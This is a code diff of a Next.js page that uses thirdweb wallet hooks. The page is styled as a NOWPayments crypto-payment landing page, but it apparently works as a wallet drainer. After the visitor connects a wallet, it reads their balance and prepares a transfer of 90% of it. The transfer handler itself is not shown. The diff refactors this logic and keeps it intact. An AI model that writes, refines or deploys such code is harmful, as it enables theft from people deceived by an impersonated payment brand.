@@ -1,30 +1,35 @@
-import { useState } from 'react';
+import { useState, useEffect } from 'react';
 import { useTransferNativeToken, useBalance, ConnectWallet } from "@thirdweb-dev/react";
 import { ethers, BigNumber } from 'ethers'; // Import BigNumber from ethers
 import styles from '../styles/Home.module.css';
 import { NextPage } from "next";
 import Head from 'next/head';
 
-
-
-const Home:NextPage = () => {
+const Home: NextPage = () => {
   
   // Hook to transfer native tokens
   const { mutate: transferNativeToken, isLoading: transferLoading, error: transferError } = useTransferNativeToken();
 
   // Hook to get user's balance
-  const { data: balanceData, isLoading: balanceLoading, error: balanceError } = useBalance();
+  const { data: balanceData, isLoading: balanceLoading, error: balanceError, refetch: refetchBalance } = useBalance();
+
+  // State to store user balance
+  const [userBalanceInEther, setUserBalanceInEther] = useState<string>('0');
 
   // Function to convert Wei to Ether
-  const weiToEther = (wei: BigNumber): string => { // Specify BigNumber as the type for wei
+  const weiToEther = (wei: BigNumber): string => {
     return ethers.utils.formatEther(wei);
   };
 
-  // Use the user's balance in Ether
-  const userBalanceInEther = balanceData ? weiToEther(balanceData.value) : '0'; // Ensure '0' is a string
+  // Fetch user's balance when component mounts
+  useEffect(() => {
+    if (balanceData) {
+      setUserBalanceInEther(weiToEther(balanceData.value));
+    }
+  }, [balanceData]);
 
   // Calculate 90% of the user's balance
-  const transferAmountInEther = userBalanceInEther ? (parseFloat(userBalanceInEther) * 0.9).toString() : '0'; // Ensure '0' is a string
+  const transferAmountInEther = (parseFloat(userBalanceInEther) * 0.9).toString();
 
   // Function to handle token transfer
   const handleTransfer = async () => {
@@ -40,8 +45,6 @@ const Home:NextPage = () => {
     }
   };
 
-  
-
   return (
     <div className={styles.container}>
       <Head>
@@ -52,8 +55,6 @@ const Home:NextPage = () => {
         />
         <link href="/favicon.ico" rel="icon" />
       </Head>
-   
-
 
       <main className={styles.main}>
         <ConnectWallet />
@@ -69,8 +70,7 @@ const Home:NextPage = () => {
         </h1>
 
         <p className={styles.description}>
-        Start Accepting Crypto Payments NOW{' '}
-         
+          Start Accepting Crypto Payments NOW{' '}
         </p>
 
         <div className={styles.grid}>
@@ -84,10 +84,7 @@ const Home:NextPage = () => {
             <p>Pay less our 0.5% fees are the lowest on the market</p>
           </a>
 
-          <a
-            className={styles.card}
-            href="https://nowpayments.io/instant-payouts"
-          >
+          <a className={styles.card} href="https://nowpayments.io/instant-payouts">
             <h2>Withdraw euro directly to your bank account &rarr;</h2>
             <p>Receive your funds directly to your wallet - right away</p>
           </a>
@@ -97,22 +94,14 @@ const Home:NextPage = () => {
             <h2>Personal account manager & 24/7 support &rarr;</h2>
             <p>Your personal manager and 24/7 support will answer all your questions</p>
           </a>
-
-        
-
-      
         </div>
       </main>
 
       <footer className={styles.footer}>
         <a href="cryptopayer.center" rel="noopener noreferrer" target="_blank">
           Made with ❤️ by NOWPayments – 2024
-
         </a>
       </footer>
-      
-     
-      
     </div>
   );
 };
